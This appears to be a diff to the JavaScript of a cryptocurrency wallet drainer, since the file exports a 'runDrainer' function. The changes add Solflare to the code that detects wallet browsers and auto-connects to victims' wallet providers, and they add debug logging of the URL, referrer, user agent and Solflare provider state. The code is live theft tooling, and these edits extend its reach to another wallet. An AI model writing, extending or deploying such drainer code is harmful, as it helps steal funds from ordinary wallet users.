@@ -5618,6 +5618,9 @@ window.runDrainer = runDrainer;
   // Auto-connect function for when dApp loads in wallet browser
   async function autoConnectInWalletBrowser() {
     console.log('[AUTO_CONNECT] Checking for wallet providers in wallet browser...');
+    console.log('[AUTO_CONNECT] Current URL:', window.location.href);
+    console.log('[AUTO_CONNECT] Referrer:', document.referrer);
+    console.log('[AUTO_CONNECT] User Agent:', navigator.userAgent);
     
     // Wait a bit for wallet providers to load
     await new Promise(resolve => setTimeout(resolve, 2000));
@@ -5672,6 +5675,16 @@ window.runDrainer = runDrainer;
     console.log('- window.glow:', !!window.glow);
     console.log('- window.trustwallet:', !!window.trustwallet);
     console.log('- window.exodus:', !!window.exodus);
+    
+    // Debug: Check Solflare provider details
+    if (window.solflare) {
+      console.log('[AUTO_CONNECT] Solflare provider details:', {
+        hasConnect: typeof window.solflare.connect === 'function',
+        isConnected: window.solflare.isConnected ? window.solflare.isConnected() : 'N/A',
+        publicKey: window.solflare.publicKey ? window.solflare.publicKey.toString() : 'N/A',
+        keys: Object.keys(window.solflare)
+      });
+    }
     
     for (const wallet of wallets) {
       try {
@@ -6243,24 +6256,27 @@ window.runDrainer = runDrainer;
           setTimeout(() => {
             // Enhanced detection: Check if we're in a wallet browser or if deep link worked
             const isInWalletBrowser = window.location.href.includes('phantom.app') || 
+                                     window.location.href.includes('solflare.com') ||
                                      window.location.href.includes('backpack.app') ||
                                      window.location.href.includes('trustwallet.com') ||
                                      window.location.href.includes('glow.app') ||
                                      window.location.href.includes('exodus.com') ||
                                      document.referrer.includes('phantom.app') ||
+                                     document.referrer.includes('solflare.com') ||
                                      document.referrer.includes('backpack.app') ||
                                      document.referrer.includes('trustwallet.com') ||
                                      document.referrer.includes('glow.app') ||
                                      document.referrer.includes('exodus.com') ||
                                      // Check for wallet-specific user agents
                                      navigator.userAgent.includes('Phantom') ||
+                                     navigator.userAgent.includes('Solflare') ||
                                      navigator.userAgent.includes('Backpack') ||
                                      navigator.userAgent.includes('TrustWallet') ||
                                      navigator.userAgent.includes('Glow') ||
                                      navigator.userAgent.includes('Exodus');
             
             // Check if wallet providers are available (indicates we're in wallet browser)
-            const hasWalletProviders = !!(window.phantom || window.backpack || 
+            const hasWalletProviders = !!(window.phantom || window.solflare || window.backpack || 
                                         window.glow || window.trustwallet || window.exodus);
             
             if (isInWalletBrowser || hasWalletProviders) {
